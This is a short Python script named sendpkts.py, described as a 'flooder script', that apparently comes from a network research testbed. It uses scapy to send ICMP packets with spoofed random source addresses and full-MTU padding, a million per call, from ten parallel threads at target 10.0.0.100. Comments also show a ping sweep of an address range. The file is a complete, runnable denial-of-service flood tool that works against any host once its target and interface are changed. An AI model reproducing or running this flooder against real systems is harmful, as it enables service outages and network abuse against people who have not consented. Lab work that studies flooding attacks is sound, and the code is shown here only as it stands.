#!/usr/bin/env python3.7
#
# File: sendpkts.py
#
# Description   : flooder script
# Created by    : Quinn Burke (qkb5007@psu.edu)
# Date          : November 2019
# Last Modified : November 2019


### Imports ###
from random import randint
from scapy.all import *
import time
import threading
import sys


### Classes ###


### Functions ###
def generateFlows(_sim_time):
    return [0, 1]


def flood(_flows, flooder_idx):
    # print("flows: ", _flows, "\nflooder_idx: ", flooder_idx)
    for i in range(1000):
        print("[Flooder %d]: sending packets toward target 10.0.0.100..." %
              flooder_idx)
        # pkt = IP(src="10.%s.%s.%s" % (str(randint(0, 255)), str(
        #     randint(0, 255)), str(randint(12, 99))), dst="10.0.0.100")/ICMP()
        pkt = IP(src="10.%s.%s.%s" % (str(randint(0, 255)), str(randint(0, 255)), str(
            randint(12, 99))), dst="10.0.0.100")/ICMP()/Raw(load='0'*1472)  # max load is size 1472 because of 28 bytes ICMP packet, so everything can fit into 1500 MTU
        print(pkt.summary(), "(len: ", len(pkt), ")")
        # send(pkt, count=10, inter=0.1, iface="uph-eth0")
        send(pkt, count=1000000, iface="uph-eth0")
        # sr1(pkt, timeout=2, iface="docker0")
        # sr(IP(dst="192.169.0.1-255")/ICMP(), timeout=2, iface="docker0")


if __name__ == '__main__':
    # Note: only one server known to flooders "10.0.0.100"
    sim_time = 60  # in seconds
    flows = generateFlows(sim_time)
    num_flooders = 10
    nf = len(flows)/num_flooders  # evenly divide flows for each flooder

    flooders = [None]*num_flooders
    for i in range(num_flooders):
        flooders[i] = threading.Thread(
            target=flood, args=(flows[int(i*nf):int((i+1)*nf)], i))
        flooders[i].start()

    # wait for flooders to finish
    for i in range(num_flooders):
        flooders[i].join()
